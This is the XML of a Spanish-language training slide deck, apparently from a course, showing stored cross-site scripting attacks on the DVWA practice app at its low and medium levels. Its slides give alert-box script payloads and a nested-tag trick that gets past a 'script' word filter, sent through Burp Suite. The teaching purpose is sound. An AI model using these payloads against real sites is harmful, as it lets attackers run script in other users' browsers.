                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>defensa</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>está</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> en </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>el</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>navegador</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>: </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="es-ES" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="10" name="Imagen 9" descr="Interfaz de usuario gráfica, Texto, Aplicación, Correo electrónico&#10;&#10;Descripción generada automáticamente">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{80ED5A0F-55B0-4806-B05A-AF107DCD5050}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6096000" y="1060955"/>
            <a:ext cx="5472608" cy="1723321"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="Imagen 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4078C2C3-BD17-D34E-EEE2-4DFBC1BD751D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="623392" y="2860761"/>
            <a:ext cx="7602891" cy="3757950"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="34063294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0363" y="210501"/>
            <a:ext cx="8784976" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DVWA: inyección XSS Almacenado – ataques - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>low</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Marcador de texto 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D5BFA20D-6818-421E-B1DE-4A37A34B161C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="692019" y="1113117"/>
            <a:ext cx="5904656" cy="386657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Se ataca por </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>POST</a:t>
            </a:r>
          </a:p>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El ataque se produce al consultar el mensaje</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Low</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>:</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="CuadroTexto 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1D522E86-E102-A651-E688-B3DD9E01E22B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1447800" y="2346849"/>
            <a:ext cx="6096000" cy="923330"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>El mensaje 3 tiene el siguiente texto</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>&lt;script&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>alert</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>(1)&lt;/script&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>pero esto no es visible de cara al usuario</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="Imagen 5" descr="Interfaz de usuario gráfica, Texto, Aplicación, Correo electrónico&#10;&#10;Descripción generada automáticamente">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FD6C74F1-1FD9-0020-0CE7-84B3B4B21F7A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6451056" y="1647190"/>
            <a:ext cx="4493260" cy="2954020"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="CuadroTexto 8">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6ECFED3D-2F32-4F4A-BDC3-050B840FFE78}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="596347" y="3646672"/>
            <a:ext cx="6096000" cy="646331"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Pero cuando esto es abierto por otro usuario al consultar el mensaje del foro, se le puede inyectar código</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="10" name="Imagen 9" descr="Interfaz de usuario gráfica, Aplicación, Word&#10;&#10;Descripción generada automáticamente">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AA8C2E45-D145-8ACA-AD69-E0880AD53860}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2551626" y="4909522"/>
            <a:ext cx="4362450" cy="1448435"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="37167327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0363" y="210501"/>
            <a:ext cx="8784976" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DVWA: inyección XSS Almacenado – ataques - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>medium</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Marcador de texto 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D5BFA20D-6818-421E-B1DE-4A37A34B161C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="692019" y="1113118"/>
            <a:ext cx="5904656" cy="162584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s-ES" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Medium</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>: Uso de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>burp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> suite </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>para inyectar “</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>&lt;</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sc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>&lt;script&gt;</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ript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>&gt;alert(1)&lt;/script&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>” en el </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>nombre</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> en lugar del texto</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="es-ES" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="CuadroTexto 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2B219950-E027-7052-1CF7-2591642740FC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="862406" y="2400071"/>
            <a:ext cx="6096000" cy="646331"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Para protegerse del previo ataque, se sustituye la palabra “script”</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Imagen 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3196D65D-74A7-2D09-3085-31636AB16C47}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6634204" y="1224552"/>
            <a:ext cx="4982270" cy="1295581"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="CuadroTexto 14">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{47257821-298A-EB1E-1D3C-7EA0370128CA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="692019" y="3326901"/>
            <a:ext cx="11114382" cy="1200329"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Cuando se introduce en el mensaje “&lt;script&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>alert</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>(1)&lt;/script&gt;” no hay inyección, por eso buscamos alternativas. Si enmascaramos el “&lt;script&gt;” de la siguiente forma</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>	&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>sc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>&lt;script&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>ript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>alert</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>(1)&lt;/script&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Vemos que no nos cabe ya que hay una restricción de longitud</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="17" name="Imagen 16">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C06CFB0E-4E1F-0472-179B-B72957A1E0FB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5091515" y="5280974"/>
            <a:ext cx="3010320" cy="704948"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="7797172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0363" y="210501"/>
            <a:ext cx="8784976" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DVWA: inyección XSS Almacenado – ataques - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>medium</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="CuadroTexto 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{74E7066D-F037-D1E6-4106-9E1759124557}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="743134" y="3421616"/>
            <a:ext cx="6096000" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Dentro del </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>repeater</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> ponemos la inyección en el </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>txtName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="CuadroTexto 8">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{37C12514-FEBA-6213-1505-E39F7B4FEF67}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="579849" y="1468999"/>
            <a:ext cx="6096000" cy="646331"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Capturamos la petición en el </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>BrupSuit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> y lo enviamos al </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>repeater</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>Ctrl+R</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="11" name="Imagen 10" descr="Interfaz de usuario gráfica, Texto&#10;&#10;Descripción generada automáticamente">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{235759C9-13CA-8729-CE6B-B15A91570B03}"/>
              </a:ext>
